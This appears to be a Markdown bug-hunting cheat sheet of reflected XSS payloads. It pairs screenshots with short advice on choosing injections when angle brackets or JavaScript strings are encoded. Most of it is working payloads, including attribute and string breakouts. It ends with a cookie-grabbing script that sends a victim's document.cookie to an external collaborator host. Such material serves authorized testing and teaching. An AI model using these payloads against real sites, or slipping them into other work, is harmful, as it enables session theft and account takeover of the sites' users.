### Testing Alert
```js
<script>alert(1337)</script>
```
![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
```js
<svg/ onload=alert(1337)//
```
![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)
```js
<Svg/OnLoad=(confirm)(1337)<!--
">cyborg71<script>alert(1337)</script>
<img src=x onerror=alert(1337)>
```
#### For testing.
```js
"><h1>cyborg.71</h1>
<script onclick="alert(1337)">
" onclick="alert(1337)
" autofocus="alert(1337)
"onmouseover="alert(1)
<a href="javascript:alert('XSS')">Click me</a>
<img src=https://i.imgflip.com/8uo0t9.jpg>
```
### Reflected XSS into attribute with angle brackets HTML-encoded
Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
  ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
If this is the case, you should inject this payloads. 
```js
" onclick="alert(1337)
" autofocus="alert(1337)
" autofocus onfocus="alert(1337)
"onmouseover="alert(1)
```
### Reflected XSS into a JavaScript string with angle brackets HTML encoded
Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
In this case you should try this payload to braek the code to inject maliciuos payload.
```js
xss';alert(1);'xss
```
Finally the code will look like this after response.
![Screenshot from 2024-06-13 00-27-23](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/363ddd77-30a1-48bc-850a-f85b0b92e312)

#### For cookie grabbing.
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
